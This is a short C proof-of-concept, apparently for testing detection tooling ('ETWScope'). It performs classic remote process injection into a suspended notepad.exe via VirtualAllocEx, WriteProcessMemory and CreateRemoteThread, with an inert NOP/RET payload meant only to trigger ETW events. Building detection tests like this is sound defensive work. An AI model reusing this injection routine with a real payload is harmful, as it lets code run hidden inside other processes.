#include <windows.h>
#include <stdio.h>

int main() {
    printf("[*] ETWScope - Simple PoC Injector (Intensity 1 - Baseline)\n");
    printf("[*] Starting target process (notepad.exe)...\n");

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] Failed to start notepad.exe (Error: %ld)\n", GetLastError());
        return 1;
    }

    printf("[+] Target process started with PID: %lu\n", pi.dwProcessId);

    // Simple shellcode (Message box or just a simple int3 padding for PoC)
    // For this PoC, we just inject NOPs to trigger the VirtualAllocEx / WriteProcessMemory / CreateRemoteThread events.
    unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0x90, 0xC3 }; // NOP, NOP, NOP, NOP, RET

    printf("[*] Allocating memory in target process...\n");
    LPVOID remote_mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        printf("[!] VirtualAllocEx failed\n");
        return 1;
    }

    printf("[*] Writing shellcode to target process...\n");
    if (!WriteProcessMemory(pi.hProcess, remote_mem, shellcode, sizeof(shellcode), NULL)) {
        printf("[!] WriteProcessMemory failed\n");
        return 1;
    }

    printf("[*] Spawning remote thread to execute shellcode...\n");
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateRemoteThread failed\n");
        return 1;
    }

    printf("[+] Injection successful. Waiting for thread to finish...\n");
    WaitForSingleObject(hThread, INFINITE);

    printf("[*] Cleaning up and terminating process...\n");
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[+] Done.\n");
    return 0;
}
